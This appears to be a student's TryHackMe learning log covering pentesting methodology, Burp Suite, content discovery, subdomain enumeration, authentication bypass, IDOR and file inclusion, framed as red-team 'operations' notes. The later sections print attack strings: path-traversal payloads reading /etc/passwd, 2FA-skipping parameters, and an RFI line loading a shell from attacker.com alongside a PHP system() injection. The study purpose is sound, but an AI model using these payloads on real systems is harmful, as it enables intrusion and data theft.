# Red-Monster-Journey
(Day 1: 2025/10/07)

📁 Introduction to Pentesting - TryHackMe

🔧 Technical Skills Acquired:

Pentesting Methodology

Black box, white box, and gray box testing approaches

Structured penetration testing cycles and phases

Legal and ethical considerations in security testing

Testing Frameworks

Reconnaissance → Scanning → Exploitation → Persistence → Covering tracks

Objective-based vs comprehensive security assessment

Scope definition and rules of engagement

Tool Awareness

Reconnaissance tools (whois, theHarvester, Maltego)

Scanning utilities (nmap, Nessus, OpenVAS)

Exploitation frameworks (Metasploit, Burp Suite, SQLmap)

Professional Practice

Documentation standards and reporting requirements

Client communication and expectation management

Continuous learning and methodology improvement

🛠️ Technical Competencies:

Security assessment methodology understanding

📁 Introduction to Pentesting - TryHackMe

🔧 Technical Skills Acquired:

Pentesting Methodologies

Black box, white box, and gray box testing approaches

Complete penetration testing lifecycle understanding

Methodology selection based on testing objectives

Legal and Ethical Framework

Written authorization requirements and scope definition

Rules of engagement and operational boundaries

Professional ethics in security testing

Testing Environments

Internal network penetration testing approaches

External infrastructure assessment methodologies

Web application security testing techniques

Tool Proficiency Awareness

Internal network tools: BloodHound, Responder, CrackMapExec

External reconnaissance: Nmap, theHarvester, Shodan

Web application testing: Burp Suite, OWASP ZAP, SQLmap

Professional Practices

Client communication and expectation management

Documentation standards and reporting frameworks

Continuous methodology improvement

🛠️ Technical Competencies:

Security assessment methodology application

Legal and ethical compliance in testing

Environment-specific tool selection

Professional security testing standards

Testing approach selection based on context

Toolchain awareness and application scenarios

Professional standards in ethical hacking

(Day 2: 2025/10/08)

📁 Burp Suite: Repeater - TryHackMe

🔧 Technical Skills Acquired:

Repeater Tool Mastery

Request/Response workflow between Proxy and Repeater modules

HTTP request modification and repeated sending techniques

Real-time analysis of server responses and error handling

SQL Injection Testing

Manual SQL injection payload crafting and testing

Error-based SQL detection through server response analysis

Parameter manipulation for vulnerability identification

Syntax validation for different SQL injection techniques

Web Application Analysis

HTTP status code interpretation (200, 500, 404)

Server error analysis and vulnerability correlation

Input validation testing through parameter manipulation

Response comparison for vulnerability detection

Security Testing Methodology

Controlled payload experimentation workflows

Manual fuzzing techniques for vulnerability discovery

Application behavior analysis through request manipulation

Exploit development and refinement processes

🛠️ Technical Competencies:

Advanced Burp Suite Repeater operation

Manual web application penetration testing

SQL injection detection and exploitation

HTTP protocol manipulation and analysis

Security vulnerability validation techniques

📁 Burp Suite: Intruder - TryHackMe

🔧 Technical Skills Acquired:

Attack Automation Framework

Sniper, Battering Ram, Pitchfork, and Cluster Bomb attack configurations

Payload positioning using § delimiters in HTTP requests

Large-scale automated security testing methodologies

Payload Management

Multiple payload set configuration and sequencing

Payload processing rules and encoding techniques

Custom payload generation and import procedures

Attack Optimization

Request throttling and resource management

Attack result analysis and filtering capabilities

Response comparison and difference identification

Practical Application Scenarios

Credential brute-forcing against authentication mechanisms

Parameter fuzzing for vulnerability discovery

Automated input validation testing

Mass vulnerability detection workflows

🛠️ Technical Competencies:

Burp Suite Intruder tool mastery

Automated web application testing

Large-scale security assessment automation

Payload management and attack optimization

📁 Burp Suite - Decoder, Sequencer, Comparer, Organizer - TryHackMe

🔧 Technical Skills Acquired:

Data Analysis & Transformation

Multi-format data decoding/encoding (Base64, URL, HTML, Hex)

Payload analysis and manipulation techniques

Quick data transformation for forensic examination

Entropy & Randomness Analysis

Statistical analysis of session tokens and critical values

Entropy testing for security-critical random generators

Pattern detection in supposedly random data sequences

Differential Analysis

Byte-level comparison of application responses

Subtle difference detection in application behavior

Change analysis between different application states

Target Management

Site and target organization during security assessments

Workflow structuring for large-scale penetration tests

Context maintenance throughout security engagements

🛠️ Technical Competencies:

Burp Suite auxiliary tools proficiency

Data analysis and transformation techniques

Statistical security analysis methodologies

Professional penetration testing workflow management

📁 Burp Suite Extender - TryHackMe

🔧 Technical Skills Acquired:

Extension Platform Mastery

BApp Store navigation and extension discovery

Installation and management of Burp Suite extensions

Community extension evaluation and selection

Essential BApp Integration

Authorization testing with Autorize extension

Java-specific scanning with J2EE Scanner

Timing attack analysis with Request Timer

Specialized vulnerability detection tools

Workflow Customization

Burp Suite customization for specific testing needs

Integration of specialized tools into main workflow

Extension of core capabilities with advanced functionality

Tool Optimization

Strategic extension selection based on application type

Extension configuration for maximum effectiveness

Automation of repetitive testing tasks

🛠️ Technical Competencies:

Burp Suite Extender platform proficiency

Security tool customization and optimization

Extension evaluation and implementation

Workflow automation through BApps

📁  Web Application Fundamentals - TryHackMe

🔧 Techincal Skills Acquired:

Web Architecture Understanding

Client-server model in modern web applications

Frontend vs backend component differentiation

HTTP/HTTPS communication flow analysis

Developer Tools Proficiency

Firefox Developer Tools navigation (Inspector, Console, Debugger)

HTML, CSS, and JavaScript source code analysis

Debugger utilization for file analysis and code execution

Client-Side Code Analysis

Exposed credentials and token identification in frontend code

Client-side business logic detection and analysis

Insecure client-side validation identification

Information disclosure vulnerability detection

Security Assessment Methodology

Systematic approach to web application examination

Attack vector identification through source code analysis

Web-specific information gathering techniques

🛠️ Technical Competencies:

Web application architecture analysis

Client-side security assessment

Developer tools operation for security testing

Source code examination techniques

# Content Discovery - TryHackMe Module

## 📖 Description
This repository documents my learning and techniques from TryHackMe's Content Discovery module, focused on methods for discovering hidden content in web applications.

## 🎯 Techniques Implemented

### 🔍 Manual Discovery
- **Robots.txt Analysis**: Identification of restricted directories
- **Favicon Fingerprinting**: Detection of frameworks using favicons
- **Sitemap.xml Examination**: Mapping of public content
- **HTTP Headers Inspection**: Analysis of software and versions

### 🌐 OSINT Techniques
- **Google Dorking**: 
```bash
  site:example.com admin
  filetype:pdf site:example.com
  inurl:admin site:example.com
Wappalyzer: Identification of web technologies

Wayback Machine: Historical analysis of sites

GitHub Recon: Search for source code and configurations

S3 Buckets Discovery: Detection of exposed cloud storage

⚡ Automation
Tool Usage: ffuf, dirb, gobuster

Wordlists Management: SecLists integration

Fuzzing Techniques: Directory and file discovery

🛠️ Tools Used
ffuf - Fast web fuzzer

dirb - Directory scanner

gobuster - Discovery tool

curl - HTTP header analysis

Browser + DevTools - Manual analysis

📁 Project Structure
text
content-discovery/
├── techniques/
│   ├── manual-discovery.md
│   ├── osint-methods.md
│   └── automated-tools.md
├── examples/
│   ├── google-dorking-examples.txt
│   └── wordlists-usage.md
└── resources/
    └── helpful-links.md

### 🎯 CURRENT PHASE: ADVANCED RECONNAISSANCE
**Module: Subdomain Enumeration - Operational Implementation**

### 🔴 SUBDOMAIN ENUMERATION TRADECRAFT

#### 📊 OPERATIONAL OBJECTIVES
- **Attack Surface Expansion**: Discover hidden infrastructure and shadow IT
- **Passive Intelligence**: Gather subdomain data without triggering alerts
- **Infrastructure Mapping**: Identify development, admin, and legacy systems
- **Initial Access Vector Identification**: Locate vulnerable entry points

#### 🎲 TACTICS, TECHNIQUES & PROCEDURES (TTPs)

##### PASSIVE ENUMERATION (STEALTH)
- **Certificate Transparency Logs**: 
  ```bash
  crt.sh analysis for historical and current subdomains
Search Engine Recon:

bash
site:*.target.com -site:www.target.com -site:blog.target.com
OSINT Automation: Sublist3r for multi-source intelligence gathering

ACTIVE ENUMERATION (CALCULATED RISK)
DNS Bruteforce:

bash
dnsrecon -d target.com -D wordlist.txt -t brt
Virtual Host Discovery:

bash
ffuf -w vhosts.txt -u http://target.com -H "Host: FUZZ.target.com"
📈 ENGAGEMENT FINDINGS TEMPLATE
text
TARGET: [REDACTED]
DATE: [OPERATIONAL TIMESTAMP]
TECHNIQUE: SSL_CERT_ANALYSIS | VIRTUAL_HOST | DNS_BRUTEFORCE
SUBDOMMAIN: [DISCOVERED_ASSET]
RISK_LEVEL: HIGH/MEDIUM/LOW
OPERATIONAL_VALUE: [POTENTIAL_ACCESS_VECTOR]
NOTES: [RECOMMENDED_NEXT_STEPS]
🚀 PROGRESSION IN RED TEAM KILL CHAIN
✅ Reconnaissance ← ENHANCED SUBDOMAIN MAPPING
✅ Weaponization
◽ Delivery
◽ Exploitation
◽ Installation
◽ C2 & Persistence
◽ Actions & Objectives

🔧 TOOLS & TRADECRAFT DOCUMENTED
Passive: crt.sh, Google Dorking, Sublist3r

Active: DNS bruteforce (calculated risk)

Stealth: Virtual host enumeration

Analysis: Subdomain categorization and prioritization

# Red Monster Journey 🐲 
## Active Red Team Operations Log

### 🎯 CURRENT PHASE: INITIAL ACCESS & PRIVILEGE ESCALATION
**Module: Authentication Bypass - Operational Implementation**

### 🔴 AUTHENTICATION BYPASS TRADECRAFT

#### 📊 OPERATIONAL OBJECTIVES
- **Initial Access Acquisition**: Gain unauthorized entry without valid credentials
- **Privilege Escalation**: Elevate access levels post-authentication
- **Control Evasion**: Bypass security mechanisms like 2FA and account lockouts
- **Stealth Persistence**: Maintain access without triggering alerts

#### 🎲 TACTICS, TECHNIQUES & PROCEDURES (TTPs)

##### CREDENTIAL DISCOVERY (STEALTH)
- **Username Enumeration**:
  ```bash
  Error message analysis: "Invalid username" vs "Invalid password"
  Timing attacks for user existence confirmation
Intelligent Brute Force:

bash
Targeted attacks with common passwords only
Rate limit awareness and bypass techniques
AUTHENTICATION FLOW MANIPULATION
Logic Flaw Exploitation:

bash
Parameter manipulation: ?authenticated=true&admin=1
Step skipping: Direct access to post-auth endpoints
2FA bypass: ?skip_2fa=1 or sequence breaking
SESSION MANIPULATION
Cookie Analysis & Modification:

bash
Plaintext: admin=false → admin=true
Encoded values: Base64/Base32 decoding/encoding
Hash pattern recognition and manipulation
📈 ENGAGEMENT FINDINGS TEMPLATE
text
TARGET: [REDACTED]
DATE: [OPERATIONAL TIMESTAMP]
TECHNIQUE: LOGIC_FLAW | COOKIE_MANIP | USER_ENUM
VULNERABILITY: [SPECIFIC_BYPASS_METHOD]
ACCESS_LEVEL: USER | ADMIN | SYSTEM
IMPACT: CRITICAL | HIGH | MEDIUM
NOTES: [PERSISTENCE_RECOMMENDATIONS]
🚀 PROGRESSION IN RED TEAM KILL CHAIN
✅ Reconnaissance
✅ Weaponization
✅ Delivery
✅ Exploitation ← AUTHENTICATION BYPASS COMPLETE
◽ Installation
◽ C2 & Persistence
◽ Actions & Objectives

🔧 TOOLS & TRADECRAFT DOCUMENTED
Enumeration: Error analysis, timing attacks

Exploitation: Parameter tampering, flow manipulation

Persistence: Cookie manipulation, session hijacking

Evasion: Rate limit bypass, alert avoidance

🎯 CRITICAL DISCOVERIES
Logic Flow Bypass: Direct admin panel access via URL manipulation

Cookie Privilege Escalation: Plaintext admin flags in session cookies

2FA Circumvention: Sequence breaking in multi-factor flows

Account Lockout Bypass: Parallel authentication attempts

OPERATIONAL NOTES: Authentication bypass techniques provide immediate initial access while maintaining low detection probability. Cookie manipulation proved particularly effective for privilege escalation post-initial compromise.

# Red Monster Journey 🐲 
## Active Red Team Operations Log

### 🎯 CURRENT PHASE: DATA ACCESS & PRIVILEGE ESCALATION
**Module: IDOR Exploitation - Operational Implementation**

### 🔴 IDOR EXPLOITATION TRADECRAFT

#### 📊 OPERATIONAL OBJECTIVES
- **Unauthorized Data Access**: Bypass access controls for horizontal/vertical movement
- **Intelligence Gathering**: Extract sensitive information through object reference manipulation
- **Privilege Boundary Testing**: Identify access control flaws in application logic
- **Mass Extraction Capability**: Develop scripts for large-scale data exfiltration

#### 🎲 TACTICS, TECHNIQUES & PROCEDURES (TTPs)

##### ENDPOINT DISCOVERY & MAPPING
- **Surface Enumeration**:
  ```bash
  API endpoints: /api/user/{id}/profile, /download?file_id={id}
  Hidden endpoints: AJAX calls, JavaScript analysis
  Development artifacts: debug parameters, test endpoints
Parameter Identification:

bash
user_id, account_id, file_id, invoice_id, document_id
Numeric, encoded, hashed identifiers
ID ANALYSIS & MANIPULATION
Encoded ID Exploitation:

bash
Base64: echo "dXNlcjE=" | base64 -d → user1
Base32, URL encoding detection and manipulation
Hashed ID Reverse Engineering:

bash
Pattern analysis: md5(1), md5(2), md5(3) sequences
Hash generation for prediction: echo -n "123" | md5sum
Unpredictable ID Methodology:

bash
Two-account approach: Account A (ID 100) vs Account B (ID 200)
ID swapping: Access Account B data while authenticated as Account A
EXPLOITATION TECHNIQUES
Horizontal Privilege Escalation:

bash
User A accesses User B data: /api/invoices?user_id=200
Mass data extraction scripts
Vertical Privilege Escalation:

bash
User accesses admin functions: /admin/users?admin_id=1
Parameter manipulation for elevated access
📈 ENGAGEMENT FINDINGS TEMPLATE
text
TARGET: [REDACTED]
DATE: [OPERATIONAL TIMESTAMP]
TECHNIQUE: ENCODED_ID | HASHED_ID | UNPREDICTABLE_ID
VULNERABILITY: [SPECIFIC_ACCESS_CONTROL_FAILURE]
ACCESS_LEVEL: HORIZONTAL | VERTICAL | DATA_ONLY
DATA_EXFILTRATED: [ESTIMATED_VOLUME]
IMPACT: CRITICAL | HIGH | MEDIUM
NOTES: [EXFILTRATION_RECOMMENDATIONS]
🚀 PROGRESSION IN RED TEAM KILL CHAIN
✅ Reconnaissance
✅ Weaponization
✅ Delivery
✅ Exploitation
✅ Installation
◽ C2 & Persistence
◽ Actions & Objectives

🔧 TOOLS & TRADECRAFT DOCUMENTED
Discovery: Endpoint mapping, parameter analysis

Analysis: Encoding/decoding, hash pattern recognition

Exploitation: Horizontal/vertical privilege escalation

Exfiltration: Script development for mass data extraction

🎯 CRITICAL DISCOVERIES
Base64 ID Manipulation: Direct object reference through encoded parameters

Predictable Hash Sequences: MD5-based IDs following numeric patterns

Horizontal Access Flaws: User-to-user data access without validation

Admin Function Exposure: Administrative endpoints accessible via ID manipulation

OPERATIONAL NOTES: IDOR vulnerabilities provide direct data access with minimal detection risk. Encoded parameters proved most common, while hashed IDs required more advanced pattern analysis. Two-account methodology essential for unpredictable identifiers.


# Red Monster Journey 🐲 
## File Inclusion Vulnerability Research & Exploitation

### 🎯 MODULE COMPLETION: FILE INCLUSION
**Status:** Mastered ✅
**Red Team Application:** Initial Access & Intelligence Gathering

### 🔴 FILE INCLUSION TRADECRAFT DOCUMENTATION

#### 📊 VULNERABILITY OVERVIEW
File inclusion vulnerabilities occur when web applications improperly validate user input used in file operations, allowing attackers to read local files or include remote files for code execution.

#### 🎲 EXPLOITATION TECHNIQUES MASTERED

##### LOCAL FILE INCLUSION (LFI)
```php
// Vulnerable Code Patterns
include($_GET['page'] . ".php");
require_once($_POST['template']);
file_get_contents($user_input);
Exploitation Payloads:

http
?page=../../../etc/passwd
?file=../../windows/win.ini
?include=php://filter/convert.base64-encode/resource=index.php
REMOTE FILE INCLUSION (RFI)
Prerequisites: allow_url_include=On

http
?page=http://attacker.com/shell.txt
?load=data://text/plain,<?php system('id'); ?>
PATH TRAVERSAL
http
# Basic Traversal
?file=../../../../etc/passwd

# Bypass Techniques
?file=....//....//....//etc/passwd
?file=../../../etc/passwd%00
?file=../../../etc/passwd................
🛠️ RED TEAM OPERATIONAL PROCEDURES
RECONNAISSANCE PHASE
Parameter enumeration in GET/POST/COOKIE/HEADERS

Application technology stack identification

PHP configuration analysis

EXPLOITATION PHASE
LFI for Intelligence Gathering

bash
/etc/passwd - User enumeration
/var/log/auth.log - Authentication logs
/proc/self/environ - Environment variables
Application config files
RFI for Initial Access

bash
Web shell deployment
Reverse shell establishment
Persistence mechanism installation
POST-EXPLOITATION
Data exfiltration from compromised systems

Lateral movement preparation

Evidence collection for campaign reporting

📈 RISK ASSESSMENT
LFI Impact: Medium-High (Data leakage, information disclosure)

RFI Impact: Critical (Remote Code Execution, full compromise)

Detection Difficulty: Low-Medium (Logs show file access patterns)

🔧 MITIGATIONS UNDERSTOOD
Input validation and whitelisting

Web application firewalls (WAF)

Proper PHP configuration hardening

Principle of least privilege for web server

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Network Security
✅ Web Application Security ← FILE INCLUSION ADDED
◽ Active Directory Exploitation
◽ Cloud Security
◽ Advanced Persistence Techniques

OPERATIONAL NOTES: File inclusion vulnerabilities remain prevalent in web applications despite being well-understood. RFI provides the most direct path to RCE, while LFI offers valuable intelligence for targeted attacks.
